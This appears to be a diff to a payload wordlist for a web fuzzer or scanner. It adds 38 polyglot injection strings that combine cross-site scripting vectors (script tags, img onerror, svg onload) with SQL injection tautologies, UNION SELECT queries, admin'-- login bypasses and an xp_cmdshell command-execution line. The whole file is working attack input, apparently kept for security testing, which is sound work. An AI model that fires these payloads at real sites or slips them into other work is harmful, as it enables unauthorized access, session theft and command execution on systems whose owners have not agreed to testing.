@@ -1,1 +1,38 @@
-'"--><script>alert(1)</script>' AND 1=1--
+'"><img src=x onerror=alert(1)>' OR 1=1--
+""><img src=x onerror=alert(1)>" OR "1"="1
+'"><script>alert(1)</script>' OR 1=1--
+'"><svg onload=alert(1)>' OR 1=1--
+' UNION SELECT '<img src=x onerror=alert(1)>',NULL--
+' UNION SELECT '<script>alert(1)</script>',NULL--
+';alert(1)// OR 1=1--
+";alert(1)// OR 1=1--
+'onerror='alert(1)' OR '1'='1
+"onerror="alert(1)" OR "1"="1
+' onerror=alert(1) OR '1'='1
+" onerror=alert(1) OR "1"="1
+'><script>alert(1)</script><!-- OR 1=1--
+"><script>alert(1)</script><!-- OR 1=1--
+'); alert(1);//' OR 1=1--
+"); alert(1);//" OR 1=1--
+'/**/><script>alert(1)</script><!--'/**/OR/**/1=1--
+" UNION SELECT xss,NULL FROM (SELECT 0x3c696d67207372633d78206f6e6572726f723d616c65727428312923 AS xss)a--
+' UNION SELECT 1,'<script>alert(1)</script>',3--
+' OR 1=1 UNION SELECT '<script>alert(1)</script>',NULL--
+';EXEC xp_cmdshell('calc.exe');--
+'||<script>alert(1)</script>||'
+''||alert(1)||''
+''><script>alert(1)</script>'' OR 1=1--
+'"'><script>alert(1)</script>
+'"><xss id=a onactivate=alert(1)>
+'"><img src=x:x onerror=alert(1) 1=2 OR 2=2--
+'"><details open ontoggle=alert(1)><!--' OR 1=1--
+'"><svg/onload=alert(1)><!-- OR 1=1--
+'"><body onload=alert(1)><!-- OR 1=1--
+' UNION SELECT '<img/src=x onerror=alert(1)>',2,3--
+' UNION SELECT NULL,'<svg onload=alert(1)>',NULL--
+admin'--<script>alert(1)</script>
+admin'/*<svg onload=alert(1)>
+admin'#"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)><!-- 1=1 --
+\'><script>alert(1)</script>
+\"><script>alert(1)</script>
